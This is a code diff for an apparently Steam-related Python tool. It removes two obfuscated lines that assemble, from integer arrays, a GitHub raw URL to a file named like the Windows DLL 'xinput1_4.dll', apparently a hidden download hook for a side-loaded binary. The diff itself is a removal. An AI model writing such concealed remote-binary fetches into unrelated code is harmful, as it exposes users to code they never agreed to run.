@@ -127,9 +127,6 @@ def list_mphpmaster_apps() -> list:
 
 # ==================== Token Configuration Functions ====================
 
-_0x=[103,105,116,104,117,98];_1x=[77,68,81,73,49];_2x=[80,111,108,97,114,84,111,111,108,115];_3x=[120,105,110,112,117,116,49,95,52,46,100,108,108]
-_4x=lambda a:''.join([chr(c) for c in a]);_xinput_url=lambda:f"https://{_4x(_0x)}.com/{_4x(_1x)}/{_4x(_2x)}/raw/main/{_4x(_3x)}"
-
 def _parse_vdf_simple(content: str) -> dict:
     """Simple VDF parser for Steam config files."""
     result = {}
